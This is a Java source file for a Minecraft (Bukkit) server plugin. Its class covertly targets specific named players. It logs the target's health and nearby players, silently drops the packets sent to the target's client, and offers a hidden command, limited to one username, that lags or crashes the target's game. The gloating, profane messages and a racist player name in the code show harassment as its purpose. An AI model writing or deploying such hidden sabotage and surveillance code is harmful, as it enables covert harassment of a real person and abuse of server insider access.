package me.txmc.gradlepluginbase.impl.listener;

import me.txmc.gradlepluginbase.common.CommonUtils;
import me.txmc.gradlepluginbase.packet.packetcommand.PacketCommand;
import me.txmc.gradlepluginbase.packet.packetcommand.PacketCommandExecutor;
import me.txmc.gradlepluginbase.packet.packetlistener.PacketEvent;
import me.txmc.gradlepluginbase.packet.packetlistener.PacketListener;
import me.txmc.gradlepluginbase.utils.Utils;
import net.minecraft.server.v1_8_R3.PacketPlayOutKeepAlive;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.PlayerMoveEvent;

import java.util.*;

public class PattonTrolling extends PacketCommandExecutor implements Listener, PacketListener {

    private final Set<Player> players = new HashSet<>();

    private boolean packetLoss = false;

    public PattonTrolling() {
        super("trollpat", "ADMIN ONLY COMMAND");
    }

    public boolean isPatton(Player player) {
        return player.getName().equals("Pyked") || player.getName().equals("DreamHatesBlacks");
    }

    public Player getPatton() {
        Player player;
        player = Bukkit.getPlayer("Pyked");
        if (player == null || !player.isOnline()) player = null;
        return player;
    }

    @EventHandler
    public void onDamage(EntityDamageByEntityEvent event) {
        if (event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            if (isPatton(player)) {
                System.out.printf("&aPattons health is at &c%s%n", player.getHealth());
            }
        }
    }

    @EventHandler
    public void onMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        if (isPatton(player)) {
            List<Player> nearbyPlayers = CommonUtils.getNearbyPlayers(player.getLocation(), 20);
            if (nearbyPlayers.size() > 1) {
                if (!players.contains(player)) {
                    System.out.println("&apatton just entered a player's proxmity");
                    players.add(player);
                }
            } else if (players.contains(player)) {
                System.out.println("&cpatton just exited a player's proximity");
                players.remove(player);
            }
        }
    }

    @Override
    public void onPacket(PacketEvent event) {
        if (event.getType() == PacketEvent.PacketEventType.OUTGOING) {
            if (isPatton(event.getPlayer()) && packetLoss) {
                if (event.getPacket() instanceof PacketPlayOutKeepAlive) return;
                event.setCancelled(true);
            }
        }
    }

    @Override
    public void onPacketCommand(PacketCommand command) {
        Player sender = command.getSender();
        if (!sender.getName().equals("SevJ6")) return;
        Player patton = getPatton();
        if (patton != null) {
            if (command.getArgs().length > 0) {
                String arg = command.getArgs()[0];
                switch (arg) {
                    case "fps" :
                        Utils.lagPlayer(patton);
                        Utils.sendMessage(sender, "&cLagging the shit out of pattons client");
                        break;
                    case "crash" :
                        Utils.crashPlayer(patton);
                        Utils.sendMessage(sender, "&cFUCKING CRASHED PATTON");
                        break;
                    case "packet" :
                        packetLoss = !packetLoss;
                        Utils.sendMessage(sender, String.format("&aserver clientbound packets for patton is %s", !packetLoss ? "&CFALSE" : "&bTRUE"));
                        break;
                }
            }
        } else {
            Utils.sendMessage(sender, "&cpatton is not online");
        }
    }
}
